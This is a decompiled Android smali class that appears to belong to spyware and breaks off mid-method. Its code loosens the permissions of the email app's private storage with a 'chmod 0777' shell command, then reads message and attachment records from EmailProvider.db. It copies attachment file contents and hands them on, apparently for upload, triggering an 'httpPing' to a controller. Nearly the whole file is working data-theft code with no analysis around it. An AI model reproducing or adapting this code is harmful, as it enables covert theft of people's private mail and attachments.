.class final Lcom/network/android/u;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Ljava/lang/String;

.field final synthetic b:Ljava/lang/String;

.field final synthetic c:Landroid/content/Context;

.field final synthetic d:Ljava/lang/String;


# direct methods
.method constructor <init>(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/network/android/u;->a:Ljava/lang/String;

    iput-object p2, p0, Lcom/network/android/u;->b:Ljava/lang/String;

    iput-object p3, p0, Lcom/network/android/u;->c:Landroid/content/Context;

    iput-object p4, p0, Lcom/network/android/u;->d:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 20

    :try_start_0
    invoke-static {}, Lcom/network/b/b;->c()Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, "GetContentMail getAttachmentFileCommand version too low. returning"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :goto_0
    return-void

    :cond_0
    const-string v1, "GetContentMail getAttachmentFileCommand get attachment start"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/network/android/u;->a:Ljava/lang/String;

    const-string v2, "_"

    invoke-virtual {v1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    aget-object v1, v1, v2

    const-string v2, "/data/data/com.android.email"

    const-string v16, "/data/data/com.android.email/databases"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "getContent Mail messages:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v3, Ljava/io/File;

    invoke-direct {v3, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/io/File;->exists()Z

    move-result v3

    if-nez v3, :cond_1

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v3, "GetContentMail  getAttachmentFileCommand DB not exists -> exit!: "

    invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "get mail - "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0

    :cond_1
    :try_start_1
    const-string v5, "/data/data/com.android.email/databases/"

    const/4 v3, 0x0

    const/4 v2, 0x0

    const/4 v4, 0x0

    new-instance v6, Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-direct {v6}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;-><init>()V

    invoke-virtual {v6}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->readLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$ReadLock;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    move-result-object v17

    :try_start_2
    const-string v6, "chmod 0777 /data/data/com.android.email; chmod 0777 /data/data/com.android.email/databases; "

    invoke-static {v6}, Lcom/network/android/m;->c(Ljava/lang/String;)V

    const-string v6, "0777"

    move-object/from16 v0, v16

    invoke-static {v0, v6}, Lcom/network/android/m;->a(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface/range {v17 .. v17}, Ljava/util/concurrent/locks/Lock;->lock()V

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "EmailProvider.db"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x0

    const/16 v7, 0x10

    invoke-static {v5, v6, v7}, Landroid/database/sqlite/SQLiteDatabase;->openDatabase(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)Landroid/database/sqlite/SQLiteDatabase;
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_f
    .catchall {:try_start_2 .. :try_end_2} :catchall_3

    move-result-object v14

    :try_start_3
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v5, "select * from Message where _id = \'"

    invoke-direct {v2, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\' "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v5, "GetContentMail getAttachmentFileCommand get mail query: "

    invoke-direct {v2, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v2, 0x0

    invoke-virtual {v14, v1, v2}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_10
    .catchall {:try_start_3 .. :try_end_3} :catchall_4

    move-result-object v15

    if-nez v15, :cond_4

    :try_start_4
    const-string v1, "GetContentMail getAttachmentFileCommand Provider == null return"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Throwable; {:try_start_4 .. :try_end_4} :catch_9
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    if-eqz v14, :cond_2

    :try_start_5
    invoke-virtual {v14}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    :cond_2
    if-eqz v15, :cond_3

    invoke-interface {v15}, Landroid/database/Cursor;->close()V

    :cond_3
    invoke-interface/range {v17 .. v17}, Ljava/util/concurrent/locks/Lock;->unlock()V
    :try_end_5
    .catch Ljava/lang/Throwable; {:try_start_5 .. :try_end_5} :catch_1

    goto/16 :goto_0

    :catch_1
    move-exception v1

    :try_start_6
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "get Mail finally- "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_6
    .catch Ljava/lang/Throwable; {:try_start_6 .. :try_end_6} :catch_0

    goto/16 :goto_0

    :cond_4
    :try_start_7
    const-string v5, ""

    invoke-interface {v15}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v1

    if-eqz v1, :cond_5

    const-string v1, "timeStamp"

    invoke-interface {v15, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v15, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "GetContentMail getAttachmentFileCommand date: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_5
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "GetContentMail getAttachmentFileCommand date: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v1, "GetContentMail getAttachmentFileCommand getAttachments"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_7
    .catch Ljava/lang/Throwable; {:try_start_7 .. :try_end_7} :catch_9
    .catchall {:try_start_7 .. :try_end_7} :catchall_2

    const/4 v2, 0x0

    :try_start_8
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v3, "select * from Attachment where _id = \'"

    invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v3, v0, Lcom/network/android/u;->b:Ljava/lang/String;

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v3, "\'"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v6, "GetContentMail getAttachmentFileCommand query: "

    invoke-direct {v3, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v3, 0x0

    invoke-virtual {v14, v1, v3}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    :try_end_8
    .catch Ljava/lang/Throwable; {:try_start_8 .. :try_end_8} :catch_11
    .catchall {:try_start_8 .. :try_end_8} :catchall_6

    move-result-object v13

    if-eqz v13, :cond_1b

    :try_start_9
    invoke-interface {v13}, Landroid/database/Cursor;->getCount()I

    move-result v1

    if-lez v1, :cond_16

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "GetContentMail getAttachmentFileCommand size: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-interface {v13}, Landroid/database/Cursor;->getCount()I

    move-result v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_6
    :goto_1
    invoke-interface {v13}, Landroid/database/Cursor;->moveToNext()Z
    :try_end_9
    .catch Ljava/lang/Throwable; {:try_start_9 .. :try_end_9} :catch_4
    .catchall {:try_start_9 .. :try_end_9} :catchall_1

    move-result v1

    if-eqz v1, :cond_17

    :try_start_a
    const-string v1, "fileName"

    invoke-interface {v13, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v13, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    const-string v1, "size"

    invoke-interface {v13, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v13, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    const-string v1, "mimeType"

    invoke-interface {v13, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v13, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    const-string v1, "_id"

    invoke-interface {v13, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v13, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    const-string v1, "contentUri"

    invoke-interface {v13, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v13, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "GetContentMail getAttachmentFileCommand: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_a
    .catch Ljava/lang/Throwable; {:try_start_a .. :try_end_a} :catch_3
    .catchall {:try_start_a .. :try_end_a} :catchall_1

    const/4 v3, 0x0

    if-eqz v1, :cond_14

    :try_start_b
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v2

    if-lez v2, :cond_14

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v10, "GetContentMail getAttachmentFileCommand URI: "

    invoke-direct {v2, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v1}, Landroid/net/Uri;->getScheme()Ljava/lang/String;

    move-result-object v2

    const-string v10, "file"

    invoke-virtual {v10, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_a

    invoke-virtual {v1}, Landroid/net/Uri;->getPath()Ljava/lang/String;
    :try_end_b
    .catch Ljava/lang/Throwable; {:try_start_b .. :try_end_b} :catch_13
    .catchall {:try_start_b .. :try_end_b} :catchall_1

    move-result-object v2

    :try_start_c
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v3, "GetContentMail getAttachmentFileCommand copy local: "

    invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_c
    .catch Ljava/lang/Throwable; {:try_start_c .. :try_end_c} :catch_14
    .catchall {:try_start_c .. :try_end_c} :catchall_1

    move-object v11, v2

    :goto_2
    :try_start_d
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, v11}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v11}, Lcom/network/android/m;->b(Ljava/lang/String;)Ljava/util/HashMap;
    :try_end_d
    .catch Ljava/lang/Throwable; {:try_start_d .. :try_end_d} :catch_15
    .catchall {:try_start_d .. :try_end_d} :catchall_1

    move-result-object v12

    :try_start_e
    const-string v2, "0777"

    invoke-static {v2, v11}, Lcom/network/android/m;->b(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_12

    invoke-virtual {v1}, Ljava/io/File;->length()J

    move-result-wide v2

    long-to-int v2, v2

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "GetContentMail getAttachmentFileCommand attachmentLength: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    if-nez v2, :cond_b

    const-string v1, "GetContentMail getAttachmentFileCommand 0 chankData fileSize"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_e
    .catch Ljava/lang/Throwable; {:try_start_e .. :try_end_e} :catch_7
    .catchall {:try_start_e .. :try_end_e} :catchall_1

    if-eqz v13, :cond_7

    :try_start_f
    invoke-interface {v13}, Landroid/database/Cursor;->close()V
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_e
    .catch Ljava/lang/Throwable; {:try_start_f .. :try_end_f} :catch_9
    .catchall {:try_start_f .. :try_end_f} :catchall_2

    :cond_7
    :goto_3
    if-eqz v14, :cond_8

    :try_start_10
    invoke-virtual {v14}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    :cond_8
    if-eqz v15, :cond_9

    invoke-interface {v15}, Landroid/database/Cursor;->close()V

    :cond_9
    invoke-interface/range {v17 .. v17}, Ljava/util/concurrent/locks/Lock;->unlock()V
    :try_end_10
    .catch Ljava/lang/Throwable; {:try_start_10 .. :try_end_10} :catch_2

    goto/16 :goto_0

    :catch_2
    move-exception v1

    :try_start_11
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "get Mail finally- "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_11
    .catch Ljava/lang/Throwable; {:try_start_11 .. :try_end_11} :catch_0

    goto/16 :goto_0

    :cond_a
    :try_start_12
    const-string v10, "content"

    invoke-virtual {v10, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1f

    invoke-virtual {v1}, Landroid/net/Uri;->getPathSegments()Ljava/util/List;

    move-result-object v2

    const/4 v1, 0x0

    invoke-interface {v2, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    const/4 v10, 0x1

    invoke-interface {v2, v10}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "/data/data/com.android.email/cache/"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v10, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v10, ".db_att/"

    invoke-virtual {v1, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_12
    .catch Ljava/lang/Throwable; {:try_start_12 .. :try_end_12} :catch_13
    .catchall {:try_start_12 .. :try_end_12} :catchall_1

    move-result-object v2

    :try_start_13
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v3, "GetContentMail getAttachmentFileCommand cashed content path: "

    invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_13
    .catch Ljava/lang/Throwable; {:try_start_13 .. :try_end_13} :catch_14
    .catchall {:try_start_13 .. :try_end_13} :catchall_1

    move-object v11, v2

    goto/16 :goto_2

    :cond_b
    :try_start_14
    invoke-virtual {v1}, Ljava/io/File;->length()J

    move-result-wide v3

    const-wide/32 v18, 0x19000

    cmp-long v3, v3, v18

    if-gez v3, :cond_10

    new-array v10, v2, [B

    new-instance v2, Ljava/io/FileInputStream;

    invoke-direct {v2, v1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-virtual {v2, v10}, Ljava/io/FileInputStream;->read([B)I

    invoke-virtual {v2}, Ljava/io/FileInputStream;->close()V

    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/network/android/u;->a:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "-single"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    iget-object v3, v0, Lcom/network/android/u;->c:Landroid/content/Context;

    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    invoke-static/range {v1 .. v10}, Lcom/network/android/r;->a(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;[B)V

    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/network/android/u;->c:Landroid/content/Context;

    invoke-static {v1}, Lcom/network/android/j;->a(Landroid/content/Context;)V
    :try_end_14
    .catch Ljava/lang/Throwable; {:try_start_14 .. :try_end_14} :catch_6
    .catchall {:try_start_14 .. :try_end_14} :catchall_0

    :goto_4
    move-object v4, v12

    :goto_5
    if-eqz v11, :cond_6

    if-eqz v4, :cond_6

    :try_start_15
    invoke-static {v4, v11}, Lcom/network/android/m;->a(Ljava/util/HashMap;Ljava/lang/String;)V
    :try_end_15
    .catch Ljava/lang/Throwable; {:try_start_15 .. :try_end_15} :catch_3
    .catchall {:try_start_15 .. :try_end_15} :catchall_1

    goto/16 :goto_1

    :catch_3
    move-exception v1

    :goto_6
    :try_start_16
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "GetContentMail  getAttachmentFileCommand- "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    const/4 v1, 0x1

    const/16 v2, 0x78

    const-string v3, "GET_ATTACHMENT_FAIL"

    invoke-static {v1, v2, v3}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    if-eqz v1, :cond_6

    const/4 v1, 0x1

    const/16 v2, 0x79

    const-string v3, "GET_ATTACHMENT_NOT_AVAILABLE"

    move-object/from16 v0, p0

    iget-object v6, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    invoke-static {v6}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v6

    invoke-static {v1, v2, v3, v6}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    const/4 v1, 0x1

    const/16 v2, -0x3cae

    const-string v3, ""

    move-object/from16 v0, p0

    iget-object v6, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    invoke-static {v6}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v6

    invoke-static {v1, v2, v3, v6}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/network/android/u;->c:Landroid/content/Context;

    const-string v2, "httpPing"

    invoke-static {v1, v2}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_16
    .catch Ljava/lang/Throwable; {:try_start_16 .. :try_end_16} :catch_4
    .catchall {:try_start_16 .. :try_end_16} :catchall_1

    goto/16 :goto_1

    :catch_4
    move-exception v1

    move-object v2, v13

    :goto_7
    :try_start_17
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "GetContentMail getAttachmentFileCommand- "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    const/4 v1, 0x1

    const/16 v3, 0x78

    const-string v4, "GET_ATTACHMENT_FAIL"

    invoke-static {v1, v3, v4}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    if-eqz v1, :cond_c

    const/4 v1, 0x1

    const/16 v3, 0x78

    const-string v4, "GET_ATTACHMENT_FAIL"

    move-object/from16 v0, p0

    iget-object v5, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    invoke-static {v5}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v1, v3, v4, v5}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    const/4 v1, 0x1

    const/16 v3, -0x3cae

    const-string v4, ""

    move-object/from16 v0, p0

    iget-object v5, v0, Lcom/network/android/u;->d:Ljava/lang/String;

    invoke-static {v5}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v1, v3, v4, v5}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/network/android/u;->c:Landroid/content/Context;

    const-string v3, "httpPing"

    invoke-static {v1, v3}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_17
    .catchall {:try_start_17 .. :try_end_17} :catchall_7

    :cond_c
    if-eqz v2, :cond_d

    :try_start_18
    invoke-interface {v2}, Landroid/database/Cursor;->close()V
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_d
    .catch Ljava/lang/Throwable; {:try_start_18 .. :try_end_18} :catch_9
